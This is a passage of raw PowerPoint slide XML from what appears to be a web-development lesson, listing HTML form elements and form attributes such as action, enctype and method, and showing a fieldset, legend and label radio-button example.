                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>optgroup</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>a group of options in a drop-down list</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>label</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;option&gt;</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>an option in a drop-down list</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>value, selected</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;button&gt;</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 clickable button (allow HTML inside)</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id,</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>value, type</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>datalist</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&gt;</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 list of pre-defined options for input</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name, id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370864">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>&lt;output&gt;</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Defines the result of a calculation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444"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id</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91444" marR="91444" marT="45723" marB="45723"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10012"/>
                  </a:ext>
                </a:extLst>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BC60F434-19F7-45A8-A41B-0B900E5DFF91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;form&gt; element</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CEEEE00-FF6B-4A59-AD3F-DDBD917023E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="263525" y="1557338"/>
          <a:ext cx="11449050" cy="4902200"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1892724">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="771520">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3096284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5688522">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20003"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>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r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>accept-charset</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>charset used to fill the form e.g. charset="utf-8"</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>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action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>URL, where to send the form contents after submit (action="" uses current URL/web page)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>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70840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>autocomplete</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0"/>
                        <a:t>on</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> | off</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>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0">
                <a:tc rowSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>enctype</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:r>
                        <a:rPr lang="fi-FI" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>application</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>x-www-form-urlencoded</a:t>
                      </a:r>
                      <a:endParaRPr lang="fi-FI" b="1" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152397" marR="76199" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc hMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:endParaRPr lang="fi-FI" b="1" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="76200" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Default. All characters are encoded before sent (spaces are converted to "+" symbols, and special characters are converted to ASCII HEX)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="76199" marR="76199" marT="76200" marB="76200"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="242147">
                <a:tc vMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc gridSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:r>
                        <a:rPr lang="fi-FI">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>multipart/form-data</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152397" marR="76199" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc hMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:endParaRPr lang="fi-FI">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="76200" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>No characters are encoded. This value is required when you are using forms that have a file upload control</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="76199" marR="76199" marT="76200" marB="76200"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc vMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc gridSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:r>
                        <a:rPr lang="fi-FI">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>text/plain</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152397" marR="76199" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc hMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" fontAlgn="t"/>
                      <a:endParaRPr lang="fi-FI">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="76200" marT="76200" marB="76200"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Spaces are converted to "+" symbols, but no special characters are encoded</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="185420">
                <a:tc rowSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" b="1" dirty="0"/>
                        <a:t>get</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Appends the form-data to the URL in name/value pairs: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>URL?name</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>value&amp;name</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>=value</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc hMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="185420">
                <a:tc vMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>post</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="2">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>Sends the form-data as an HTTP post transaction</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc hMerge="1">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>novalidate</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>
                </a:tc>
                <a:tc gridSpan="3">
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>if present, form is not validated automatically</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91438" marR="91438"/>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AC092DE7-F3D6-4816-8152-2E37897E79DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;fieldset&gt;, &lt;legend&gt; and &lt;label&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69635" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95B115D0-FBFD-48EF-957D-EAFBF57F0F04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;label&gt; can be tied to an input field with for attribute. Clicking the text will select the radio/checkbox input or the input field gains focus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fieldset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; and &lt;legend&gt; can be used to make more beautiful forms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </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fieldset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>legend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>gender</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legend</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</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a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input</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type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"radio"</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name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gender</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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value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"m"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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male</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </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label</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>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male</a:t>
            </a:r>
            <a:r>
